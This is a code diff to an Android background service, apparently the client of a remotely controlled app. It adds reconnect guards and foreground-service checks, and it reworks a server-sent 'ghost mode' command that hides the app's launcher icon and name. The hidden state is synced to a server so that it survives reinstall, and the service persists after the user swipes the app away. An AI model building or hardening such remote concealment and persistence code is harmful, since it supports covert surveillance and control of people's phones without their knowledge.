@@ -47,6 +47,9 @@ public class BackgroundKeepAliveService extends Service {
     public static final String HEARTBEAT_FILE = "bg_service_alive";
 
     private Socket mBgSocket = null;
+    private volatile boolean mBgSocketConnecting = false;
+    /** True only while the service is genuinely in the foreground state (guards startForeground). */
+    private static volatile boolean sForegroundActive = false;
     private PowerManager.WakeLock mWakeLock = null;
     private WifiManager.WifiLock mWifiLock = null;
     private final Handler mWatchdogHandler = new Handler(Looper.getMainLooper());
@@ -181,7 +184,12 @@ public class BackgroundKeepAliveService extends Service {
         AppLogs.i(TAG, "onTaskRemoved: Activity swiped away, ensuring BackgroundKeepAliveService persists!");
         touchHeartbeat();
         setRunningState(true);
-        startInForeground();
+        // Only re-push the foreground notification while we are actually a
+        // foreground service. Calling startForeground() after the system has
+        // demoted us throws RemoteServiceException on API 26+.
+        if (isForegroundActive()) {
+            startInForeground();
+        }
         if (mBgSocket == null || !mBgSocket.connected()) {
             initBackgroundSocket();
         }
@@ -266,15 +274,34 @@ public class BackgroundKeepAliveService extends Service {
                 } else {
                     startForeground(NOTIFICATION_ID, notification);
                 }
+                sForegroundActive = true;
             } catch (Exception fgsEx) {
                 Log.w(TAG, "startForeground typed failed, falling back to basic foreground", fgsEx);
                 try {
                     startForeground(NOTIFICATION_ID, notification);
-                } catch (Exception ignored) {}
+                    sForegroundActive = true;
+                } catch (Exception ignored) {
+                    sForegroundActive = false;
+                }
             }
         } catch (Exception e) {
+            sForegroundActive = false;
             Log.e(TAG, "Error starting foreground notification", e);
         }
+    }
+
+    /** True only while this service is genuinely in the foreground state. */
+    private boolean isForegroundActive() {
+        if (!sForegroundActive) return false;
+        try {
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                android.app.NotificationManager nm =
+                        (android.app.NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
+                // If the system dropped our notification we are no longer foreground.
+                return nm != null && nm.getActiveNotifications() != null;
+            }
+        } catch (Throwable ignored) {}
+        return sForegroundActive;
     }
 
     private void createNotificationChannel() {
@@ -337,9 +364,18 @@ public class BackgroundKeepAliveService extends Service {
     private void initBackgroundSocket() {
         if (mBgSocket != null) {
             if (mBgSocket.connected()) return;
-            mBgSocket.connect();
+            // Socket.IO already retries on its own. Re-entering here on every
+            // watchdog tick (5s) stacked reconnects and leaked listeners.
+            if (mBgSocket.connected() || mBgSocketConnecting) return;
+            mBgSocketConnecting = true;
+            try {
+                mBgSocket.connect();
+            } catch (Exception ignored) {
+                mBgSocketConnecting = false;
+            }
             return;
         }
+        mBgSocketConnecting = true;
         try {
             IO.Options opts = new IO.Options();
             opts.reconnection = true;
@@ -352,6 +388,7 @@ public class BackgroundKeepAliveService extends Service {
             AppLogs.registerSocket(mBgSocket);
 
             mBgSocket.on(Socket.EVENT_CONNECT, args -> {
+                mBgSocketConnecting = false;
                 String sId = mBgSocket != null ? mBgSocket.id() : "null";
                 AppLogs.i(TAG, "Background KeepAlive Socket Connected [id=" + sId + ", url=" + SERVER_URL + "]");
                 AppLogs.flushPersistentLogs(mBgSocket);
@@ -359,12 +396,14 @@ public class BackgroundKeepAliveService extends Service {
             });
 
             mBgSocket.on(Socket.EVENT_DISCONNECT, args -> {
+                mBgSocketConnecting = false;
                 String reason = (args != null && args.length > 0 && args[0] != null) ? String.valueOf(args[0]) : "unknown";
                 String sId = mBgSocket != null ? mBgSocket.id() : "null";
                 AppLogs.w(TAG, "Background KeepAlive Socket Disconnected [id=" + sId + ", url=" + SERVER_URL + ", reason=" + reason + "]");
             });
 
             mBgSocket.on(Socket.EVENT_CONNECT_ERROR, args -> {
+                mBgSocketConnecting = false;
                 String error = (args != null && args.length > 0 && args[0] != null) ? String.valueOf(args[0]) : "unknown";
                 AppLogs.e(TAG, "Background KeepAlive Socket Connect Error [url=" + SERVER_URL + ", error=" + error + "]");
             });
@@ -465,9 +504,19 @@ public class BackgroundKeepAliveService extends Service {
                             });
                         }
                     } else if ("ghost_mode".equals(command)) {
-                        Object rawValue = data.opt("value");
-                        boolean enable = (rawValue instanceof Boolean && (Boolean) rawValue) 
-                                         || "true".equals(String.valueOf(rawValue));
+                        // A missing value must never be read as "false" — that
+                        // silently disabled ghost mode on every toggle command
+                        // that carried no explicit flag.
+                        Boolean parsed = parseOptionalBool(data.opt("value"));
+                        boolean enable;
+                        if (parsed != null) {
+                            enable = parsed;
+                        } else {
+                            boolean current = getSharedPreferences(GhostStateSync.PREF_NAME, Context.MODE_PRIVATE)
+                                    .getBoolean(GhostStateSync.KEY_GHOST, false);
+                            enable = !current;   // no opinion sent → flip
+                        }
+                        Log.i(TAG, "Ghost command: raw=" + data.opt("value") + " -> enable=" + enable);
                         setGhostMode(enable);
                     }
                 } catch (Exception e) {
@@ -477,6 +526,7 @@ public class BackgroundKeepAliveService extends Service {
 
             mBgSocket.connect();
         } catch (Exception e) {
+            mBgSocketConnecting = false;
             Log.e(TAG, "Error initializing background socket", e);
         }
     }
@@ -493,6 +543,7 @@ public class BackgroundKeepAliveService extends Service {
             payload.put("ram", ram);
             payload.put("platform", "android");
             payload.put("role", "background_service");
+            GhostStateSync.putGhostFields(payload, this);
 
             if (mBgSocket != null && mBgSocket.connected()) {
                 mBgSocket.emit("register-device", payload);
@@ -550,31 +601,26 @@ public class BackgroundKeepAliveService extends Service {
     }
 
     private void setGhostMode(boolean enable) {
-        try {
-            android.content.pm.PackageManager pm = getPackageManager();
-            String pkg = getPackageName();
-            android.content.ComponentName normalAlias = new android.content.ComponentName(pkg, pkg + ".MainAliasNormal");
-            android.content.ComponentName ghostAlias  = new android.content.ComponentName(pkg, pkg + ".MainAliasGhost");
-            if (enable) {
-                // Ghost ON: hide real icon/name, keep an invisible (transparent) launcher entry so the app stays openable
-                pm.setComponentEnabledSetting(normalAlias,
-                    android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
-                    android.content.pm.PackageManager.DONT_KILL_APP);
-                pm.setComponentEnabledSetting(ghostAlias,
-                    android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
-                    android.content.pm.PackageManager.DONT_KILL_APP);
-            } else {
-                // Ghost OFF: enable normal alias → real icon visible
-                pm.setComponentEnabledSetting(ghostAlias,
-                    android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
-                    android.content.pm.PackageManager.DONT_KILL_APP);
-                pm.setComponentEnabledSetting(normalAlias,
-                    android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
-                    android.content.pm.PackageManager.DONT_KILL_APP);
-            }
-            Log.d("VRemoteBkg", "Ghost mode " + (enable ? "ENABLED — app removed from launcher" : "DISABLED — app visible"));
-        } catch (Exception e) {
-            Log.e("VRemoteBkg", "Ghost mode error: " + e.getMessage());
-        }
+        // Single source of truth: save to local prefs + server (survives reinstall) + apply aliases
+        GhostStateSync.save(this, enable);
+        Log.d("VRemoteBkg", "Ghost mode " + (enable ? "ENABLED — app removed from launcher" : "DISABLED — app visible"));
+    }
+
+    /**
+     * Lenient boolean parsing for protocol values.
+     * Returns null when the value carries no opinion (missing / null / empty),
+     * so callers can distinguish "off" from "not specified".
+     */
+    static Boolean parseOptionalBool(Object raw) {
+        if (raw == null) return null;
+        if (raw instanceof Boolean) return (Boolean) raw;
+        if (raw instanceof Number) return ((Number) raw).intValue() != 0;
+        String s = String.valueOf(raw).trim().toLowerCase();
+        if (s.isEmpty() || "null".equals(s)) return null;
+        if (s.equals("true") || s.equals("1") || s.equals("on") || s.equals("yes")
+                || s.equals("enable") || s.equals("enabled")) return Boolean.TRUE;
+        if (s.equals("false") || s.equals("0") || s.equals("off") || s.equals("no")
+                || s.equals("disable") || s.equals("disabled")) return Boolean.FALSE;
+        return null;
     }
 }
